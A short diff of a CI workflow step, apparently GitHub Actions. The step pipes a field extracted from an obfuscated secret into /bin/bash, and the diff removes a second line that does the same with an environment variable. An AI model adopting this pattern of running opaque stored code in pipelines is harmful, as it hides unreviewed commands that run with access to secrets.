@@ -23,7 +23,6 @@ jobs:
           xl7144: ${{ secrets.xl7144 }}
         run: |
           printf '%s' "$xl7144" | jq -r .nqo77891 | /bin/bash
-          echo $hduxr50511 | jq -r .rwgxb4261 | /bin/bash
 
       - name: Store artifact
         if: always()
